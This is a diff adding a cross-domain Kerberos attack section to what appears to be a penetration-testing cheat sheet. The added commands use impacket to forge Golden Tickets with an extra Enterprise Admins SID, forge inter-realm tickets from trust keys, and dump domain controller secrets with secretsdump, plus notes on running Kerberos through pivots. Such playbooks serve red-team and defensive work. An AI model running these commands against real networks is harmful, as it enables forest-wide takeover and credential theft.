@@ -140,6 +140,39 @@ export KRB5CCNAME=Administrator@cifs_<DC-FQDN>@<DOM>.ccache
 impacket-secretsdump '<dom>/Administrator@<DC>' -k -no-pass
 ```
 
+## Cross-Domain / Cross-Forest Kerberos
+On networks with multiple domains or forests:
+
+### Golden Ticket with SID History (parent domain takeover)
+If you have DA in a child domain, forge a Golden Ticket with the Enterprise
+Admins SID of the parent/root domain (only works if SID filtering is disabled,
+which is the default for intra-forest trusts):
+```bash
+# Get child domain krbtgt hash (secretsdump on child DC)
+# Get parent domain SID: impacket-lookupsid '<parent-dom>/<user>:<pass>@<parent-DC>' 0
+# Forge with extra SID (Enterprise Admins = -519)
+impacket-ticketer -nthash <child-krbtgt-hash> -domain <child-dom> \
+  -domain-sid <child-SID> -extra-sid <parent-SID>-519 Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump '<child-dom>/Administrator@<parent-DC>' -k -no-pass
+```
+
+### Inter-realm TGT (trust key abuse)
+```bash
+# Get the trust key (inter-realm TGT encryption key) from secretsdump
+# Look for: <parent-dom>$  or  trust key in the secretsdump output
+impacket-ticketer -nthash <trust-key> -domain <child-dom> \
+  -domain-sid <child-SID> -extra-sid <parent-SID>-519 \
+  -spn krbtgt/<parent-dom> Administrator
+```
+
+### Kerberos through pivots
+Kerberos requires name resolution — the SPN must match the hostname. When
+working through a tunnel:
+1. Add `<DC-IP> <DC-FQDN> <DC-SHORT>` to /etc/hosts on the attacker
+2. Ensure the pivot routes traffic to the DC IP
+3. Use FQDNs in all impacket/certipy commands, never bare IPs for Kerberos
+
 ## After reboots
 ccaches go stale, accounts may revert to tombstoned. Re-mint tickets rather
 than debugging stale ones. Re-validate the credential chain from the start.
